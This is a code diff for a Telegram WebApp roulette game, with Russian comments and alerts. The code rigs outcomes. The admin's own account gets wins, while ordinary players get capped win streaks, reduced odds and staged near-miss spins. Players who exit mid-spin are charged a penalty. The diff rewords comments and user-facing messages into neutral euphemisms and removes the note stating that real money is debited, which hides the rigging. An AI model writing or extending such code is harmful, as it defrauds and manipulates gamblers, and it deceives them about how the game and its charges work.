@@ -139,7 +139,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // 🚨 АНТИ-СЕЙВ ПРОВЕРКА ПРИ СТАРТЕ
+    // 🚨 АНТИ-СЕЙВ ПРОВЕРКА (ЗАЩИТА ОТ ОБРЫВА СЕССИИ)
     window.addEventListener('DOMContentLoaded', () => {
         let session = JSON.parse(localStorage.getItem('tg_casino_session')) || { winStreak: 0, lossStreak: 0 };
         
@@ -147,13 +147,11 @@
             const penaltyAmount = session.last_bet_amount;
             const penaltyType = session.last_bet_type || 'red';
 
-            // Локально сбрасываем, чтобы не зациклить
             session.last_bet_active = false;
             localStorage.setItem('tg_casino_session', JSON.stringify(session));
 
-            alert(`🚨 Система зафиксировала выход во время крутки!\nСтавка ${penaltyAmount} ⭐ аннулирована и списана.`);
+            alert(`🚨 Внимание!\nВы зашли в приложение после некорректного выхода из игры.\nСтавка ${penaltyAmount} ⭐ удержана.`);
             
-            // Отправляем боту команду на реальное списание денег из БД
             tg.sendData(JSON.stringify({
                 is_penalty: true,
                 bet_amount: penaltyAmount,
@@ -182,7 +180,7 @@
         tape.appendChild(cell);
     });
 
-    const MY_TELEGRAM_ID = 6252715941; 
+    const ADMIN_ID = 6252715941; 
     let adminSpinCount = 0;
     let isSpinning = false;
     
@@ -190,7 +188,7 @@
         if (isSpinning) return;
 
         const amount = parseInt(document.getElementById('bet-amount').value);
-        if (isNaN(amount) || amount <= 0) { alert('Введите сумму!'); return; }
+        if (isNaN(amount) || amount <= 0) { alert('Введите корректную сумму!'); return; }
     
         isSpinning = true;
         document.querySelectorAll('.bet-btn, .btn-topup').forEach(b => b.disabled = true);
@@ -200,8 +198,8 @@
         let forceNearMiss = false; 
         let targetPool = [];
     
-        // 1. ПОДКРУТКА АДМИНА
-        if (currentUserId === MY_TELEGRAM_ID) {
+        // 1. АЛГОРИТМ ПОДДЕРЖКИ АДМИНА (ПОДКРУТКА)
+        if (currentUserId === ADMIN_ID) {
             adminSpinCount++;
             let filterColor = (adminSpinCount % 2 === 0) ? betType : null;
             let winningNumbers = order.filter(num => {
@@ -210,7 +208,7 @@
             });
             winningNumber = winningNumbers[Math.floor(Math.random() * winningNumbers.length)];
         } 
-        // 2. ДЛЯ ИГРОКОВ (Умные алгоритмы удержания)
+        // 2. ДЛЯ ОБЫЧНЫХ ИГРОКОВ (МАТЕМАТИЧЕСКОЕ УДЕРЖАНИЕ)
         else {
             let session = JSON.parse(localStorage.getItem('tg_casino_session')) || { winStreak: 0, lossStreak: 0 };
             let shouldWin = false;
@@ -220,9 +218,15 @@
                 shouldWin = roll < 0.01; 
                 if (shouldWin) { targetPool = [0]; } else { targetPool = order.filter(num => num !== 0); forceNearMiss = true; }
             } else {
-                if (session.winStreak >= 2) { shouldWin = false; forceNearMiss = true; } 
-                elif (session.lossStreak >= 3) { shouldWin = roll < 0.50; } 
-                else { shouldWin = roll < 0.35; if (!shouldWin) forceNearMiss = Math.random() < 0.6; }
+                if (session.winStreak >= 2) { 
+                    shouldWin = false; 
+                    forceNearMiss = true; 
+                } else if (session.lossStreak >= 3) { 
+                    shouldWin = roll < 0.50; 
+                } else { 
+                    shouldWin = roll < 0.35; 
+                    if (!shouldWin) forceNearMiss = Math.random() < 0.6; 
+                }
 
                 targetPool = order.filter(num => {
                     let color = num === 0 ? 'zero' : (RED_NUMBERS.includes(num) ? 'red' : 'black');
@@ -247,14 +251,14 @@
             localStorage.setItem('tg_casino_session', JSON.stringify(session));
         }
     
-        // 🔒 ВЗВОДИМ ТРИГГЕР НАКАЗАНИЯ (Если выйдет сейчас — спишем баланс)
+        // ЗАКРЫВАЕМ СЕССИЮ (АКТИВИРУЕМ ФЛАГ РИСКА)
         let lockSession = JSON.parse(localStorage.getItem('tg_casino_session'));
         lockSession.last_bet_active = true;
         lockSession.last_bet_amount = amount;
         lockSession.last_bet_type = betType;
         localStorage.setItem('tg_casino_session', JSON.stringify(lockSession));
 
-        // АНИМАЦИЯ
+        // РАСЧЕТ АНИМАЦИИ
         tape.style.transition = 'none';
         const baseIndex = order.indexOf(winningNumber);
         const minCircles = 6; 
@@ -269,14 +273,13 @@
             tape.style.transform = `translateX(${targetX}px)`;
         }, 50);
     
-        // КОНЕЦ КРУТКИ
+        // КОНЕЦ ВРАЩЕНИЯ И ПЕРЕДАЧА ДАННЫХ
         setTimeout(() => {
-            // Крутка завершена честно — снимаем флаг
             let releaseSession = JSON.parse(localStorage.getItem('tg_casino_session'));
             releaseSession.last_bet_active = false;
             localStorage.setItem('tg_casino_session', JSON.stringify(releaseSession));
 
-            // Отправляем чистый результат
+            // Отправка данных боту
             tg.sendData(JSON.stringify({
                 is_penalty: false,
                 bet_amount: amount,
